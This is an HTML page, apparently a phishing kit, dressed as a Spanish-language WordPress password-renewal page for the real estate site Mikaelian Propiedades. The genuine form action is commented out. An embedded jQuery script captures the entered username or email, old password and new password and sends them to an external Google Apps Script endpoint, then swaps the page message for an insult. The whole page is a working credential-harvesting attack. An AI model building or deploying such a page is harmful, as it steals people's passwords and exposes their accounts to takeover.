	<body class="login login-action-lostpassword wp-core-ui  locale-es-es">
		<div id="login">
        <h1><a href="https://www.mikaelianpropiedades.com" title="Mikaelian Propiedades" tabindex="-1">Mikaelian Propiedades</a></h1>

	<p class="message" id="info"><strong>Renovar contraseña</strong><br>Por favor, escribe tu nombre de usuario o tu correo electrónico, la contraseña anterior y la contraseña nueva. Elige una contraseña fácil de recordar pero difícil de adivinar.</p>

    <!-- action="https://www.mikaelianpropiedades.com/wp-login.php?action=lostpassword" -->
<form name="lostpasswordform" id="lostpasswordform" method="post">
	<p>
		<label for="user_login" >Nombre de usuario o dirección de correo<br />
        <input type="text" name="user" class="input" value="" size="20" /></label>
        <label for="user_login" >Contraseña anterior<br />
        <input type="password" name="old_password" class="input" value="" size="20" /></label>
        <label for="user_login" >Contraseña nueva<br />
        <input type="password" name="new_password" class="input" value="" size="20" /></label>
	</p>
		<input type="hidden" name="redirect_to" value="" />
	<p class="submit"><input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Actualizar contraseña" /></p>
</form>

<script>
var $form = $('form#lostpasswordform'),
    url = 'https://script.google.com/macros/s/AKfycbxJijLtzM0aSMHtMmJrb5Qx_ZT3nOkOXQE9gKBjspyvRl7HSls/exec'
    $('#wp-submit').on('click', function(e) {
    e.preventDefault();
    object_to_send = $form.serialize();
    object_to_send += "&timestamp="+(new Date()).toUTCString();
    console.log(object_to_send);
    var jqxhr = $.ajax({
        url: url,
        method: "GET",
        dataType: "json",
        data: object_to_send
    }).success(
        document.getElementById("info").innerHTML = "<font color=\"red\">PUTA</font>"
    );
    })
</script>
